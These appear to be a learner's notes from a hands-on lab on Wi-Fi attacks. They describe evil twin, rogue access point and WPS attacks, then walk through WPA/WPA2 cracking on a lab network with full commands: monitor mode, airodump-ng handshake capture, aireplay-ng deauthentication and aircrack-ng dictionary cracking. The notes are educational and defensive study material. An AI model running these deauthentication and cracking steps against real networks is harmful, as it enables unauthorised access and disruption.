Learning Objectives
- Understand what Wi-Fi is
- Explore its importance for an organization
- Learn the different Wi-Fi attacks
- Learn about the WPA/WPA2 cracking attack

Wi-Fi Attacks
	Evil Twin Attack:
		Typically begins by sending victims de-authentication packets, which disconnects them from their trusted access point(ap). Attacker creates fake ap with an ssid similar to the victims (typosquatting, e.g., FrostburgStaff-> Fr0stburgStaff Ideally, after multiple attempts reconnecting to the trusted ap, the attacker expects the victim to try their fake ap, so they can listen to all of the victims traffic. 
	Rogue Access Point:
		Similar to Evil Twin, the attacker configures a rogue access point near their targets and waits for them to accidentally join, so they can intercept traffic. 
	Wi-Fi Protected Setup Attack (WPS):
			preface: WPS created so users connect to their wifi using an 8 digit pin as opposed to a complex password. 
		Attack by ==initiating a WPS handshake with the router and capturing the router's response== (contains info about pin + psk), and vulnerable to brute-force. 
WPA/WPA2 cracking
	Attackers start by sending de-auth packets to active users. Once they disconnect, they'll try and reconnect which will start a 4-way handshake with the router. 
	The 4-way handshake
		First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker may run brute-force or dictionary attacks offline, using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.
	- **Router sends a challenge:** The router (or access point) sends a challenge" to the client, asking it to prove it knows the network's password without directly sharing it.
	- **Client responds with encrypted information:** The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.
	- **Router verifies and sends confirmation:** If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.
	- **Final check and connection established:** The client verifies the router's response, and if everything matches, they finish setting up the secure connection.
The Vulnerability 
	Attackers can listen for incoming connections while users try to initiate connections. 
The Practical
	run 'iw dev' to show available wireless devices and their configs
		![[Pasted image 20250207121036.png]]
	MAC/Basic SSID (AP)
	type 'managed' = Standard mode where device act as client, connecting to an AP. 
	run 'sudo iw dev wlan2 scan' where we specify the ap (dev wlan2) and scan the area for wifi networks
		![[Pasted image 20250207121307.png]]
	BSSID = 02:00:00:00:02:00
	SSID = MalwareM_AP - This suggets the ap is discoverable for local clients. 
	Robust Security Network(RSN, part of WPA2 standard used to define encryption and auth settings)
		Group and Pairwise ciphers = Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used. 
		 'Auth suite' lets us know a pre-shared key is required for access. 
		DS Parameter Set = Channel 6 refers to a specific frequency range. 
			most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimizing interference. More channels available in the 5GHz channel. 
	Monitor mode 
		Primarily used for network analysis and auditing. 
		- The AP passively captures all traffic on a specific channel regardless of whether the traffic is intended for the AP. 
		run 'sudo ip link set dev wlan2 down'
			turns the AP off
		run 'sudo iw dev wlan2 set type monitor'
			switches mode from managed to monitor 
		run 'sudo ip link set dev wlan2 up'
			turns ap on
		- ![[Pasted image 20250207122359.png]]
		run 'sudo iw dev wlan2 info'
			to verify changes
			![[Pasted image 20250207122448.png]]
	Practical 
		two terminals and ssh sessions 
			 run 'sudo airodump-ng wlan2' 
			- Provides list of nearby wifi networks (SSIDs)) + details about their signal strength, channel and encryption 
			![[Pasted image 20250210164840.png]]
		We discovered most of this info earlier from the 'iw scan' output, but we now have the listening channel(6). 
		run sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
			captures traffic and saves info to files w/ names that start with 'output-file' (useful for cracking)
		![[Pasted image 20250210165705.png]]
			While this is active, we are waiting for airodump to capture the 4-way handshake. First, it'll check for any active connections. If active, we can perform a deauth attack; otherwise, we'll capture the handshake for any new connecitions. 
			In the screenshot, we've captured information about the access point (shown under the first 'BSSID') and connected clients (shown underneath the second 'BSSID') 
			 'STATION' shows the clients MAC address.
	Deauth attack from second terminal w/ aireplay-ng
		aireplay can either target a specific client(targeted attack) or all clients connected to an AP (Broadcast attack)
		Clients automatically tries to reconnect after (initiating the handshake process)
		aireodump captures handshake as it happens. 
	run  sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2 
		-0  indicates that we are using the deauthentication attack 
		 1 value is the number of deauths to send. 
		-a indicates the BSSID of the access point   
		-c indicates the BSSID of the client to deauthenticate
	![[Pasted image 20250210170644.png]]
Performing a dictionary attack on the output captured
	run 'sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output(x)cap
		-a 2 indicates WPA/WPA2 attack mode
		-b indicates the BSSID of the AP
		-w indicates the wordlist to use for the attack. 
		output(asterik)cap indicates the captured handshake files. 
	![[Pasted image 20250210171148.png]]
Joining MalwareM_AP using the PSK derived from aircrack-ng
	![[Pasted image 20250210171517.png]]
Confirming we've joined the network 
	run 'iw dev'
	![[Pasted image 20250210171732.png]]
![[Pasted image 20250210171847.png]]
Whew, this room was a lot to take in. Nonetheless, I enjoyed the hands-on experience involving wireless attacks. Lastly, I plan to experiment further with aircrack-ng because of its versatility. 